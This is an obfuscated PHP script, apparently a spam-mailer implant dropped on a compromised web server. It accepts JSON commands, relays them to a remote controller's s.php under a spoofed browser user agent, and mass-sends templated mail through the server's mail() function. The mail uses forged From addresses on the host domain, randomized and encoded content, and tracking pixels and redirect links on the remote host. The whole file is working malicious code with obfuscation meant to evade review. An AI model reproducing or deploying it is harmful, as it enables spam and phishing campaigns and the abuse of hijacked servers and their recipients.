<?php
@ini_set('max_execution_time', '3600'); @ini_set('max_input_time', '3600'); @set_time_limit(3600); @date_default_timezone_set('UTC'); class Macros { private $values = array(); private $fixed = array(); private $used = array(); private $_keys = array(); public function __get($spb9aaa2) { if ($spb9aaa2 == 'keys') { return array_keys($this->_keys); } } public function Import($spb9aaa2, $sp7ca3a9) { if (is_array($sp7ca3a9)) { $this->values[$spb9aaa2] = array(); foreach ($sp7ca3a9 as $sp5cef58) { if (!empty($sp5cef58['key'])) { $this->values[$spb9aaa2][$sp5cef58['key']] = $sp5cef58['value']; } else { $this->values[$spb9aaa2][] = $sp5cef58['value']; } } } else { $this->Assign($spb9aaa2, $sp7ca3a9); } } public function Assign($spb9aaa2, $spb99724) { $this->values[$spb9aaa2] = $spb99724; } public function Parse($sp730b0f) { $spf482ac = ''; $spc018de = 0; while (true) { $sp9b6699 = strpos($sp730b0f, '{', $spc018de); if ($sp9b6699 === false) { $spf482ac .= substr($sp730b0f, $spc018de); break; } $spf482ac .= substr($sp730b0f, $spc018de, $sp9b6699 - $spc018de); $spc018de = $sp9b6699 + 1; $spa1e810 = ''; $spdce2e0 = '{'; $sp9ed749 = array(); $sp833378 = false; $sp56cfeb = false; $spfa4cd3 = 'var'; while ($spc018de < strlen($sp730b0f)) { $spbf19da = substr($sp730b0f, $spc018de, 1); $spdce2e0 .= $spbf19da; if ($spbf19da == ',' || $spbf19da == '>' || $spbf19da == '|') { if ($spfa4cd3 == 'alias') { $sp833378 = $spa1e810; } elseif ($spfa4cd3 == 'mod') { $sp56cfeb = $spa1e810; } else { $sp9ed749[] = $spa1e810; } $spa1e810 = ''; if ($spbf19da == '>') { $spfa4cd3 = 'alias'; } if ($spbf19da == '|') { $spfa4cd3 = 'mod'; } $spc018de++; continue; } if ($spbf19da == '}') { if ($spfa4cd3 == 'alias') { $sp833378 = $spa1e810; } elseif ($spfa4cd3 == 'mod') { $sp56cfeb = $spa1e810; } else { $sp9ed749[] = $spa1e810; } $spc018de++; break; } $spa1e810 .= $spbf19da; if (preg_match('/[0-9A-Za-z_\\[\\]\\-\\^!]/', $spbf19da) == 0) { $spc018de++; $sp9ed749 = array(); break; } $spc018de++; } if (sizeof($sp9ed749) == 0) { $spf482ac .= $spdce2e0; continue; } $sp1fd171 = false; $spaaf3ee = false; if (preg_match('/^\\^/', $sp9ed749[0]) > 0) { $sp9ed749[0] = substr($sp9ed749[0], 1); $sp1fd171 = true; } if (preg_match('/^\\!/', $sp9ed749[0]) > 0) { $sp9ed749[0] = substr($sp9ed749[0], 1); $spaaf3ee = true; } $sp0f613f = false; if (preg_match('/\\[([0-9A-Za-z_]+)\\]/', $sp9ed749[0], $sp0fc7d7) > 0) { $sp0f613f = $sp0fc7d7[1]; } elseif (preg_match('/\\[([\\d\\-]+)\\]/', $sp9ed749[0], $sp0fc7d7) > 0) { $sp0f613f = explode('-', $sp0fc7d7[1]); } if ($sp0f613f !== false) { $sp9ed749[0] = substr($sp9ed749[0], 0, strpos($sp9ed749[0], '[')); } $this->_keys[$sp9ed749[0]] = true; if (empty($this->values[$sp9ed749[0]])) { continue; } if ($sp1fd171) { unset($this->fixed[$sp9ed749[0]]); } if (isset($this->fixed[$sp9ed749[0]])) { $spe70775 = $this->fixed[$sp9ed749[0]]; } else { $spe70775 = ''; $spdc6b72 = 1; if (sizeof($sp9ed749) == 2) { $spdc6b72 = $sp9ed749[1]; } if (sizeof($sp9ed749) == 3) { $spdc6b72 = rand($sp9ed749[1], $sp9ed749[2]); } for ($speb07d5 = 0; $speb07d5 < $spdc6b72; $speb07d5++) { if (is_array($this->values[$sp9ed749[0]])) { if (!is_array($this->used[$sp9ed749[0]])) { $this->used[$sp9ed749[0]] = array(); } if (count($this->used[$sp9ed749[0]]) == count($this->values[$sp9ed749[0]])) { $this->used[$sp9ed749[0]] = array(); } if ($sp0f613f !== false && is_scalar($sp0f613f)) { $spe70775 .= $this->values[$sp9ed749[0]][$sp0f613f]; $this->used[$sp0f613f] = true; } else { $sp79708b = array(); if (is_array($sp0f613f)) { $speeac81 = $sp0f613f[0]; $sp964fb9 = $sp0f613f[1]; } else { $speeac81 = 0; $sp964fb9 = count($this->values[$sp9ed749[0]]) - 1; } for ($sp1f5628 = $speeac81; $sp1f5628 <= $sp964fb9; $sp1f5628++) { if ($spaaf3ee && !empty($this->used[$sp9ed749[0]][$sp1f5628])) { continue; } $sp79708b[] = $sp1f5628; } $sp8770e1 = $sp79708b[rand(0, count($sp79708b) - 1)]; $this->used[$sp9ed749[0]][$sp8770e1] = true; $spe70775 .= $this->values[$sp9ed749[0]][$sp8770e1]; } } else { $spe70775 .= $this->values[$sp9ed749[0]]; } } } $spe70775 = $this->Parse($spe70775); if ($sp56cfeb !== false) { for ($spb69822 = 0; $spb69822 < strlen($sp56cfeb); $spb69822++) { switch (substr($sp56cfeb, $spb69822, 1)) { case 'b': $spe70775 = base64_encode($spe70775); break; case 'q': $spe70775 = quoted_printable_encode($spe70775); break; default: break; } } } if ($sp1fd171) { $this->fixed[$sp9ed749[0]] = $spe70775; } if ($sp833378 !== false && $sp833378 != '') { $this->fixed[$sp833378] = $spe70775; } $spf482ac .= $spe70775; } return $spf482ac; } } $sp33f6f7 = file_get_contents('php://input'); $spc201af = json_decode($sp33f6f7, true); if (empty($spc201af['via_proxy'])) { $spc201af['via_proxy'] = true; $spd786e8 = curl_init($spc201af['prefix'] . 's.php'); $sp0b9ce5 = json_encode($spc201af); curl_setopt($spd786e8, CURLOPT_CONNECTTIMEOUT, 30); curl_setopt($spd786e8, CURLOPT_TIMEOUT, 600); curl_setopt($spd786e8, CURLOPT_RETURNTRANSFER, true); curl_setopt($spd786e8, CURLOPT_USERAGENT, 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15'); curl_setopt($spd786e8, CURLOPT_REFERER, $sp6da2ce); curl_setopt($spd786e8, CURLOPT_POST, true); curl_setopt($spd786e8, CURLOPT_POSTFIELDS, $sp0b9ce5); curl_setopt($spd786e8, CURLOPT_HTTPHEADER, array('Content-Type: application/json', 'Content-Length: ' . strlen($sp0b9ce5))); $sp875e8c = curl_exec($spd786e8); echo $sp875e8c; die; } $spcb8d18 = $_SERVER['SERVER_ADDR']; $spb189ff = $_SERVER['HTTP_HOST']; $spb189ff = preg_replace('/^www\\./', '', $spb189ff); $spf2bf4a = new Macros(); $spf2bf4a->Assign('server_addr', $spcb8d18); $spf2bf4a->Assign('server_host', $spb189ff); foreach ($spc201af['macros'] as $spb9aaa2 => $sp7ca3a9) { $spf2bf4a->Import($spb9aaa2, $sp7ca3a9); } $sp5ba0b9 = preg_replace('/^www\\./i', '', $spb189ff); $spa02d74 = $spf2bf4a->Parse('{from_user}@' . $sp5ba0b9); $spf2bf4a->Assign('from_email', $spa02d74); $spf2bf4a->Assign('prefix', $spc201af['prefix']); $spf2bf4a->Assign('html', $spc201af['letter']['html']); $spc018de = 0; $spfee9d9 = 0; $sp31b5fb = 0; $spfcde7d = array(); foreach ($spc201af['rcpt'] as $sp0aa217) { $spf2bf4a->Assign('email', $sp0aa217['email']); $spf2bf4a->Assign('entry', $sp0aa217); $spf2bf4a->Assign('date', date('r')); $spf2bf4a->Assign('redirect', $spc201af['prefix'] . 'r.php?id=' . $sp0aa217['id'] . '&uri='); $spf2bf4a->Assign('unsubscribe', $spc201af['prefix'] . 'u.php?id=' . $sp0aa217['id']); $spf2bf4a->Assign('delivery', '<img src="' . $spc201af['prefix'] . 'd.php?id=' . $sp0aa217['id'] . '" />'); $sp7d3e97 = $spf2bf4a->Parse($spc201af['envelope']['header']); $sp5fd5e1 = $spf2bf4a->Parse($spc201af['envelope']['body']); if (!empty($sp0aa217['name'])) { $spfb84fa = $sp0aa217['name'] . ' <' . $sp0aa217['email'] . '>'; } else { $spfb84fa = $sp0aa217['email']; } $sp426f0a = $spf2bf4a->Parse($spc201af['letter']['subject']); $spbe0346 = mail($spfb84fa, $sp426f0a, $sp5fd5e1, $sp7d3e97); $spfcde7d[$sp0aa217['id']] = $spbe0346; if ($spbe0346) { $spfee9d9++; } else { $sp31b5fb++; } $spc018de++; } echo serialize(array('total' => count($spc201af['rcpt']), 'sent' => $spc018de, 'success' => $spfee9d9, 'error' => $sp31b5fb, 'rcpt' => $spfcde7d));